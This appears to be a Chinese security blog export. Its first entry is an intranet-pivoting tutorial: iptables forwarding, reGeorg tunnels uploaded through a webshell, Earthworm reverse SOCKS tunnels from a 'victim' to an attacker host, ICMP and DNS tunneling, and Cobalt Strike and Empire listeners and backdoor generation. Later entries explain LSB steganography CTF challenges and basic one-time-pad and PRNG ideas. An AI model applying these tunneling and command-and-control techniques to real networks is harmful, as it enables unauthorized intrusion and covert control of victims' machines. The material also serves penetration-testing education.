<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line">echo <span class="number">1</span>&gt;<span class="meta-keyword">/proc/</span>sys<span class="meta-keyword">/net/</span>ipv4/ip_forward          <span class="comment">//当主机发现不是自己的流量就会进行转发</span></span><br><span class="line">sysctl -p                                     <span class="comment">//立即生效</span></span><br></pre></td></tr></table></figure></div>

<p><strong>配置iptables进行端口转发</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -m tcp --dport21521 -j DNET --to-destination <span class="number">192.168</span><span class="number">.0</span><span class="number">.211</span>:<span class="number">1521</span></span><br><span class="line"><span class="comment">//把目的端口为21521的端口的流量转发到192.168.0.211主机的1521端口，DNAT表示目的地址转换</span></span><br><span class="line">iptables -t nat -A POSTROUTING -s <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -d <span class="number">192.168</span><span class="number">.0</span><span class="number">.211</span> -p tcp -m tcp --dport <span class="number">1521</span> -j SNAT --to-source <span class="number">192.168</span><span class="number">.0</span><span class="number">.132</span></span><br><span class="line"><span class="comment">//指定192.168.0.0/16 ip段的请求进行来源地址转换</span></span><br></pre></td></tr></table></figure></div>

<h3 id="内网代理工具"><a href="#内网代理工具" class="headerlink" title="内网代理工具"></a>内网代理工具</h3><h4 id="regeorg内网代理工具"><a href="#regeorg内网代理工具" class="headerlink" title="regeorg内网代理工具"></a>regeorg内网代理工具</h4><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606132624260.png" alt="image-20200606132624260"></p>
<p>reGeorgSocksProxy.py是运行在本机上的，渗透一个网站之后，上传对应格式的tunnel文件到服务器</p>
<h5 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h5><p>首先通过webshell等方式上传对应的可使用的代理脚本</p>
<h5 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h5><p>然后攻击者在本地执行python脚本，利用网络上的脚本建立socks5代理隧道</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u <span class="string">http:</span><span class="comment">//10.128.2.171/tunnel.nosocket.php</span></span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135145093.png" alt="image-20200606135145093"></p>
<p>此时用软件连接到socks5代理127.0.0.1:8888就处于该服务器的内网环境了</p>
<h4 id="配合使用的软件："><a href="#配合使用的软件：" class="headerlink" title="配合使用的软件："></a>配合使用的软件：</h4><p><strong>MAC下：</strong><br>proxychains（Proxifier/直接用burpsuite或浏览器连接到socks5代理<br><strong>Windows下：</strong><br>Proxifier.exe/直接用burpsuite或浏览器连接到socks5代理<br><strong>Linux下：</strong><br>proxychains</p>
<p><strong>proxychains配置</strong></p>
<p>首先修改配置文件</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135511794.png" alt="image-20200606135511794"></p>
<p>在MAC或者linux_上，修改配置文件后，就可以直接在想执行的命令前加上proxychians命令，这样会自动让后面的命令通过代理执行</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135625508.png" alt="image-20200606135625508"></p>
<h3 id="集代理和端口转发功能于一身的Earthworm（多平台）"><a href="#集代理和端口转发功能于一身的Earthworm（多平台）" class="headerlink" title="集代理和端口转发功能于一身的Earthworm（多平台）"></a>集代理和端口转发功能于一身的Earthworm（多平台）</h3><h4 id="直接当做socks5代理使用"><a href="#直接当做socks5代理使用" class="headerlink" title="直接当做socks5代理使用"></a>直接当做socks5代理使用</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">ew_wi<span class="symbol">n32</span>.exe -s ssocksd -h</span><br><span class="line"><span class="comment">//列出参数</span></span><br></pre></td></tr></table></figure></div>

<p>使用命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">ew_win32.exe -s ssocksd -l <span class="number">8082</span></span><br><span class="line"><span class="comment">//监听8082端口</span></span><br></pre></td></tr></table></figure></div>

<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>rssocks和rcsocks则是成对使用的选项，可以直接搭建lcx那样的端口转发隧道，只不过转发的端口直接就是earthworm提供的socks5代理</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140307805.png" alt="image-20200606140307805"></p>
<p>内网victim主机执行的是将建立在本地的socks5代理转发到公网某端口<br>公网attacker的主机执行的是监听两个端口，一个用来接收attacker的链接，一个用来转发内网的代理</p>
<h5 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h5><p>首先在公网主机上监听好两个端口，等待内网主机链接</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140721591.png" alt="image-20200606140721591"></p>
<h5 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h5><p>然后在victim的电脑上执行earthworm以开启socks5代理，并执行转发</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140744284.png" alt="image-20200606140744284"></p>
<h5 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h5><p>浏览器设置好代理后就相当于已经处于该内网直接可以访问内网的资源</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140856159.png" alt="image-20200606140856159"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140910046.png" alt="image-20200606140910046"></p>
<p>或者也可以通过<br>proxychains/proxifier把代理用在其<br>他的一些工具上<br>nmap/sqlmap/rdesktop</p>
<h3 id="多级级联"><a href="#多级级联" class="headerlink" title="多级级联"></a>多级级联</h3><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141238357.png" alt="image-20200606141238357"></p>
<p>数据流向：SOCKS v5-&gt; 1080-&gt; 8888-&gt; 9999-&gt; 7777-&gt; rssocks</p>
<h3 id="ICMP-UDP内网穿透"><a href="#ICMP-UDP内网穿透" class="headerlink" title="ICMP/UDP内网穿透"></a>ICMP/UDP内网穿透</h3><h4 id="icmptunnel内网穿透"><a href="#icmptunnel内网穿透" class="headerlink" title="icmptunnel内网穿透"></a>icmptunnel内网穿透</h4><p>icmptunnel借助icmp协议进行通信</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141542429.png" alt="image-20200606141542429"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141552013.png" alt="image-20200606141552013"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141640116.png" alt="image-20200606141640116"></p>
<h4 id="服务端执行的脚本和启动命令"><a href="#服务端执行的脚本和启动命令" class="headerlink" title="服务端执行的脚本和启动命令"></a>服务端执行的脚本和启动命令</h4><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141716894.png" alt="image-20200606141716894"></p>
<h4 id="客户端执行的脚本和启动的命令"><a href="#客户端执行的脚本和启动的命令" class="headerlink" title="客户端执行的脚本和启动的命令"></a>客户端执行的脚本和启动的命令</h4><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141809132.png" alt="image-20200606141809132"></p>
<h3 id="DNS协议穿透内网"><a href="#DNS协议穿透内网" class="headerlink" title="DNS协议穿透内网"></a>DNS协议穿透内网</h3><h4 id="dns2tcp工具安装"><a href="#dns2tcp工具安装" class="headerlink" title="dns2tcp工具安装"></a>dns2tcp工具安装</h4><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142043435.png" alt="image-20200606142043435"></p>
<h4 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h4><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142111545.png" alt="image-20200606142111545"></p>
<p>一条A记录和一条Ns记录当查询到ssrf这个子域名的时候(xxxx.ssrf.nuptzj.cn)会去ns记录指向的blog子域名查询</p>
<h4 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h4><p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142433789.png" alt="image-20200606142433789"></p>
<p>启动服务器端</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcpd.conf -d <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142523168.png" alt="image-20200606142523168"></p>
<p>启动客户端 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">dns2tcpc</span> <span class="selector-tag">-r</span> <span class="selector-tag">ssh</span> <span class="selector-tag">-I</span> 7777 <span class="selector-tag">-z</span> <span class="selector-tag">ssrf</span><span class="selector-class">.nuptzj</span><span class="selector-class">.cn</span> <span class="selector-tag">blog</span><span class="selector-class">.nuptzj</span><span class="selector-class">.cn</span></span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606143114174.png" alt="image-20200606143114174"></p>
<p>连接到ssh服务</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606143205496.png" alt="image-20200606143205496"></p>
<h3 id="端口复用技术"><a href="#端口复用技术" class="headerlink" title="端口复用技术"></a>端口复用技术</h3><p>参考链接 <a href="https://xz.aliyun.com/t/1661" target="_blank" rel="noopener">https://xz.aliyun.com/t/1661</a></p>
<h2 id="常见工具介绍与使用"><a href="#常见工具介绍与使用" class="headerlink" title="常见工具介绍与使用"></a>常见工具介绍与使用</h2><h3 id="Cobaltstrike使用介绍"><a href="#Cobaltstrike使用介绍" class="headerlink" title="Cobaltstrike使用介绍"></a>Cobaltstrike使用介绍</h3><h4 id="Cobaltstrike搭建与应用"><a href="#Cobaltstrike搭建与应用" class="headerlink" title="Cobaltstrike搭建与应用"></a>Cobaltstrike搭建与应用</h4><p>启动Cobaltstrike Team Server</p>
<p>配置完java环境以后直接运行teamserver文件就可以开启<br>./teamserver[服务器的IP] [你的连接密码]</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144233886.png" alt="image-20200606144233886"></p>
<p>Cobalt Strike Client<br>运行cobaltstrike客户端文件连接到该服务器</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144742574.png" alt="image-20200606144742574"></p>
<p>在面板中填入配置信息就可以点击connect连接到C&amp;C服务器，Cobaltstrike是一个适合团队协作的平台，可以多人连接到服务器，一起对客户机进行渗透操作，共享shell</p>
<h4 id="Listener设置"><a href="#Listener设置" class="headerlink" title="Listener设置"></a>Listener设置</h4><p>首次使用需要先设置一个默认的listener，就是指的程序默认监听回连靶机的方式（就是渗透的靶机回连的端口是vps的8088端口，然后客户端这边监听vps的8088）</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144855822.png" alt="image-20200606144855822"></p>
<p>监听有很多种方式，dns，ttp，https选择https或者dns协议会让通信更加隐秘，不那么容易被侦测到流量<img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145236715.png" alt="image-20200606145236715"></p>
<h4 id="Attacks模块"><a href="#Attacks模块" class="headerlink" title="Attacks模块"></a>Attacks模块</h4><p>设置完监听我们就可以来看看有哪些方式能用来攻击</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145433934.png" alt="image-20200606145433934"></p>
<p>Cs提供的直接生成恶意文件的方式</p>
<p>Cs提供的包括站点克隆（钓鱼），添加文件到网页 链接利用WEB方式传输payload，应用识别等辅助攻击功能</p>
<h4 id="生成可执行文件后门"><a href="#生成可执行文件后门" class="headerlink" title="生成可执行文件后门"></a>生成可执行文件后门</h4><p>使用Attacks-&gt;Packages–&gt;Windows executable生成一个恶意文件</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145830581.png" alt="image-20200606145830581"></p>
<p>listener表示当对方运行了这个.exe文件后，对方已怎样的方式回连到主控端</p>
<h4 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h4><p>通过各种手段让靶机执行以后，可以看到客户端上线啦~<br>CS的载荷不是时刻保持socket通信的，而是有–定的心跳时间，默认是每一分钟会向C&amp;C服务器拉取一-下最新的指令并执行，所以我们下达指令后，靶机会周期性的来获取命令然后执行并返回结果（可以通过Beacon中的sleep命令调整时间）</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606150051268.png" alt="image-20200606150051268"></p>
<h4 id="如何进入Beacon控制台"><a href="#如何进入Beacon控制台" class="headerlink" title="如何进入Beacon控制台"></a>如何进入Beacon控制台</h4><p>对着目标右键选择interact可以进入这个目标的控制台界面</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606150458393.png" alt="image-20200606150458393"></p>
<h3 id="Metasploit使用介绍"><a href="#Metasploit使用介绍" class="headerlink" title="Metasploit使用介绍"></a>Metasploit使用介绍</h3><h3 id="Empire使用介绍"><a href="#Empire使用介绍" class="headerlink" title="Empire使用介绍"></a>Empire使用介绍</h3><h4 id="Empire工具安装向导"><a href="#Empire工具安装向导" class="headerlink" title="Empire工具安装向导"></a>Empire工具安装向导</h4><p>项目地址：<br><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a><br>安装方法：<br>使用ubuntu或者debian<br>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a><br>cd setup&amp;&amp;sudo./install.sh<br>这个工具安装前要先配置好python和pip</p>
<h4 id="设置Listener"><a href="#设置Listener" class="headerlink" title="设置Listener"></a>设置Listener</h4><p>empire的监听方式</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606152723567.png" alt="image-20200606152723567"></p>
<p>包含的类型比较多：<br>●可以委派给其他监听器的比如msf的meterpreter<br>●基于利用微软onedrive作为c&amp;c服务器 的监听器onedrive直接是在本机监听http及 多种http相关协议的多个监听器</p>
<p>执行uselistener http以后直接按照默认配置执行execute会启动http80端口的监听当然也可以通过info命令显示选项，通过set命令调整设置以后再execute启动</p>
<h4 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h4><p>设置完监听模式以后生成payload<br>可以直接通过launcher powershel[python]http生成连接到对应的监听器的payload</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606152928138.png" alt="image-20200606152928138"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153712491.png" alt="image-20200606153712491"><br><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153724477.png" alt="image-20200606153724477"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153758800.png" alt="image-20200606153758800"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153817638.png" alt="image-20200606153817638"></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153853515.png" alt="image-20200606153853515"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Lsb隐写总结</title>
    <url>/undefined/Lsb%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<p>摘自：<a href="https://segmentfault.com/a/1190000016223897" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016223897</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">其实吧一开始我是想把一大堆算法理论和公式摆上来讲讲lsb隐写是什么，但是想想，这种做法是真的可恶啊，摆明不想让人看嘛。所以我想先从一道例题出发，原理什么的将在这个过程中，细细地讲来。</span><br><span class="line">先来看下面一张图，这道题来自实验吧（原题链接：http:<span class="regexp">//</span>www.shiyanbar.com<span class="regexp">/ctf/</span><span class="number">1897</span>），题目名字叫--最低位的轻吻。</span><br></pre></td></tr></table></figure></div>

<p><img src="https://segmentfault.com/img/bVbgeGu?w=485&h=650" alt="图片描述"></p>
<p>打开看是一张很著名的图片—–胜利之吻。图片是bmp格式。看到题目中有最低位几个字，如果是对隐写类的题目熟悉的话就能一下子想到是lsb隐写。因为lsb隐写就是利用的图像中的最低有效位。最低有效位这个词在前文中出现很多次了，但是到底是什么意思呢？<br>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br><img src="https://segmentfault.com/img/bVbgeGw?w=842&h=323" alt="图片描述"></p>
<p>LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。<br><img src="https://segmentfault.com/img/bVbgeGG?w=865&h=331" alt="图片描述"></p>
<p>上图我们可以看到，十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。我修改最低有效位的信息的算法就叫做lsb加密算法，提取最低有效位信息的算法叫做lsb解密算法。<br>再放两张图加深下理解：<br><img src="https://segmentfault.com/img/bVbgeGI?w=675&h=227" alt="图片描述"></p>
<p><img src="https://segmentfault.com/img/bVbgeGK?w=624&h=332" alt="图片描述"></p>
<p>回到题目上来，这里我们使用一款功能很强大的lsb隐写分析工具—StegSolve图片通道查看器（下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="noopener">http://www.caesum.com/handboo…</a>）。<br>使用过photoshop的朋友应该对图片通道有些概念，一幅完整的图像，红色绿色蓝色三个通道缺一不可。一幅图像，如果关闭了红色通道，那么图像就偏青色。如果关闭了绿色通道，那么图像就偏洋红色。如果关闭了蓝色通道，那么图像就偏黄色。当然还有个Alpha通道，是一个8位的灰度通道，也可以理解为透明度（粗糙的理解）。关于图像通道详细的讲解可以自行百度，这里不再详细说明。<br>使用stegsolve打开图片，按右方向键查看各通道显示的图像。一般有些题目会在某一个图像通道中直接显示出flag，但是显然这题不行，看来还需要绕些弯，要获取最低位的图片信息。<br>所以这道题的思路就是将图片转换成0,1 像素点（图像处理问题），这里可以直接使用MATLAB（MATLAB特别适合图像处理，而且语法特别特别简单）：<br>在命令行窗口输入以下命令：</p>
<blockquote>
<blockquote>
<p>filename=’01.bmp’;<br>imfinfo(filename);<br>A = imread(filename);<br>B = logical(bitget(A,1));<br>imshow(B);<br>指令详解：<br><img src="https://segmentfault.com/img/bVbgeG0?w=772&h=219" alt="图片描述"></p>
</blockquote>
</blockquote>
<p>运行得结果如下。扫描这个二维码，就能直接得到flag，有兴趣的朋友可以自己动手扫一下。<br><img src="https://segmentfault.com/img/bVbgeHp?w=865&h=479" alt="图片描述"></p>
<p>这里还可以使用其他的编程算法来解，原理都是一样的，但如果不会matlab语法，该怎么办呢。其实这题还有一种解法，因为只是简单的获取最后一位然后画图，但是为啥stegsolve获取不到呢。<br>我们先来看下图像信息：<br><img src="https://segmentfault.com/img/bVbgeHC?w=583&h=222" alt="图片描述"></p>
<p>发现是bmp的8位灰度图。猜测是StegSolve解析8位的BMP存在问题？</p>
<p>常见的8位通道RGB图像，3个通道共24位，即一张24位RGB图像里可表现大约1670万种颜色；而16位通道RGB图像，3个通道共48位，2的48次方是多少种颜色。32位深度CMYK（8位×4通道）。<br>这里的8位、16位、32位指颜色深度（Color Depth）用来度量图像中有多少颜色信息可用于显示或打印像素，其单位是“位（Bit）”，所以颜色深度有时也称为位深度。<br>常用的颜色深度是1位、8位、24位和32位。1位有两个可能的数值：0或1。较大的颜色深度（每像素信息的位数更多）意味着数字图像具有较多的可用颜色和较精确的颜色表示。</p>
<p>试试转换成png格式呢再看看呢？用画图另存为png格式（不能直接改后缀）。此时发现文件变大，图像信息如下图：<br><img src="https://segmentfault.com/img/bVbgeHZ?w=559&h=183" alt="图片描述"></p>
<p>用StegSolve打开后，在RGB的最后一位看到二维码。（原图在保存的时候显示的类型是256色位图，就是位深度为8，如果保存为24位位图的bmp格式，不转换为png格式，也能用StegSolve找到如上图的二维码。）<br><img src="https://segmentfault.com/img/bVbgeIm?w=519&h=803" alt="图片描述"></p>
<p><img src="https://segmentfault.com/img/bVbgeIm?w=519&h=803" alt="图片描述"></p>
<p>所以我们改变图片位深度，就能得到其中的二维码信息。</p>
<p><strong>Lsb隐写的变形题</strong></p>
<p>经过上面的例子，我们基本上了解了什么是lsb隐写。一般的lsb隐写我们都能使用工具或者编写程序提取到图片的最低有效位信息，从而得到其中的内容。但是出题人的脑洞不局限于此，lsb隐写还有各种扩展的使用方法。下面是网鼎杯第一场中的一道杂项题，也是一道lsb隐写题。不同的是，光提取最低有效位是不能进行解答的。<br>首先给我们的是一张花花的图是png格式。题目名字是minify，使变小的意思，那应该就是指lsb隐写。<br><img src="https://segmentfault.com/img/bVbgeIN?w=864&h=42" alt="图片描述"></p>
<p>光凭肉眼是真的什么也看不出，我们借助于工具StegSolve进行分析。<br>一路翻下去，除了花花的还是花花的，唯一值得怀疑的地方就在red plane 0 这里是纯黑，<br><img src="https://segmentfault.com/img/bVbgeIR?w=865&h=163" alt="图片描述"></p>
<p><img src="https://segmentfault.com/img/bVbgeIY?w=841&h=657" alt="图片描述"></p>
<p>说明这里什么也没有，正常的图片都不会是这样子的，其它通道也都显示正常。所以这个异常给我们什么启示呢？从这里可以真正确定是lsb隐写了。</p>
<p>那我们要从其他的通道比如：blue、alpha、green中找些到信息。整张图片看起来是毫无规则的像素点，那一定想把真正的信息隐藏起来，再用一些毫无规则的像素点干扰我们。我们如果想得到其中的信息，就要去掉这些干扰点。但是到底去掉哪些呢。经过前面的步骤我们知道了信息可能隐藏在plane 0中，所以我们要先把各个通道的plane 0提取出来。Red plane 0因为是空信息，可以不用提取了。我们提取出（File-&gt;Save as）Green plane 0、Alpha plane 0、Blue plane 0，把他们各另存为一张图。然后各个图进行比对（Analyse-&gt;image Combiner），最后发现Alpha plane 0 和Green plane 0 异或运算下的图出现了flag<br><img src="https://segmentfault.com/img/bVbgeI2?w=865&h=135" alt="图片描述"></p>
<p>异或对比常常是为了检查两张图片之间的差异，能发现我们肉眼看不到的及细微的差异。<br><img src="https://segmentfault.com/img/bVbgeI6?w=528&h=426" alt="图片描述"></p>
<p>上图是异或（XOR）对比出一张图片中的区别，所以用这个方法，也能把我们的信息隐藏在其中，但我觉得这并不是一种实用的方法。</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>Lsb隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>现代对称加密算法原理</title>
    <url>/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>对称密码沿用替代置换等古典密码技术(混乱与扩散) , 被称为传统密码</p>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h4 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h4><p>一次性密码本+完美秘密+伪随机数生成+Diffie-Hellman密钥交换</p>
<h5 id="一次性码本原理："><a href="#一次性码本原理：" class="headerlink" title="一次性码本原理："></a>一次性码本原理：</h5><p>首先是需要加密的明文：“hello”; ——————————————5位字母</p>
<p>然后生成一串拥有与明文相同位数的随机位移：“2,3,1,2,1”———-5个位移</p>
<p>每个位移分别对应相同位的字母进行位移得到密文：</p>
<p><strong>这样加密的信息有两个强大的特性。</strong></p>
<p>第一：位移没有重复的规律</p>
<p>第二：加密的消息将有一个均匀的频率分布，将不会被频率分析破解</p>
<h5 id="完美密码原理："><a href="#完美密码原理：" class="headerlink" title="完美密码原理："></a>完美密码原理：</h5><p>假设A写信给B,长度为20个字母，下一步，A用一个和B共享的密钥，它由20个随机生成的位移组成， 每个位移在1到26之间，密钥空间就是所有可能结果的组合。所以，生成一个密钥相当于，从这20个字母的组合中随机选一个</p>
<p>例：</p>
<p>假设要将   “ALICE”   通过位移加密，首先随机生成5个位移，每个位移的值为0-26，对应26个英文字母。</p>
<p>当使用位移进行加密时，也就是说A经过位移有26种可能，然后L经过位移也有26种可能 ……… 一共就是:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">位移空间 = <span class="number">26</span>*<span class="number">26</span>*<span class="number">26</span>*<span class="number">26</span>*<span class="number">26</span></span><br></pre></td></tr></table></figure></div>

<p>然后因为是随机得到的5个位移，就能理解每一个位移都有26种可能，所以密钥空间为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">密钥空间 = <span class="number">26</span>*<span class="number">26</span>*<span class="number">26</span>*<span class="number">26</span>*<span class="number">26</span></span><br></pre></td></tr></table></figure></div>

<p>当使用密钥空间中的 “一种密钥” 对位移空间的 “一种位移可能” 进行加密时，生成一种对应的密文信息；</p>
<p>所以密文信息空间的大小等于密钥空间；</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FIX"><figure class="iseeu highlight /fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">密文信息空间</span>=<span class="string">位移空间=密钥空间</span></span><br></pre></td></tr></table></figure></div>

<p>这对应了完美密码，当有人仅仅获得了加密文字的一页，他们所知道的唯一的事情是每个消息是同等可能的。所以无论有多大的计算能力，都不能帮助改进一个盲目的猜测。</p>
<p>现在要考虑的是在考虑一次性码本的时候，是我们需要事先分享这些长长的密钥，为了解决这个问题 ，我们需要放松对秘密的定义，这需要引入伪随机数的概念。</p>
<h5 id="伪随机数生成原理："><a href="#伪随机数生成原理：" class="headerlink" title="伪随机数生成原理："></a>伪随机数生成原理：</h5><p>首先选择一个数</p>
<p>例 “121” ，称之为 “种子”</p>
<p>然后将 “种子” 相乘获得乘积 “14641”  </p>
<p>再从乘积中取中间的与”种子“相同位数的一个数 “464”，</p>
<p>重复生成乘积，再取中间值，最后生成一串随机数</p>
